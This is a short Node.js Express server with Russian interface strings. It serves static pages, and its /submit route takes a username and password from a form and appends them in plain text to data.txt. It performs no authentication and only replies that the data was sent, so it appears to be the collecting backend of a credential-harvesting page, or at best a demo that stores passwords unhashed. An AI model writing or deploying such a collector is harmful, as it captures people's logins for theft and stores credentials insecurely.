const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

app.post("/submit", (req, res) => {
    const { username, password } = req.body;
    const data = `Логин: ${username}, Пароль: ${password}\n`;
    fs.appendFileSync("data.txt", data);
    res.send("<h2>Данные успешно отправлены!</h2><a href='/'>Вернуться</a>");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Сервер запущен на порту " + PORT));
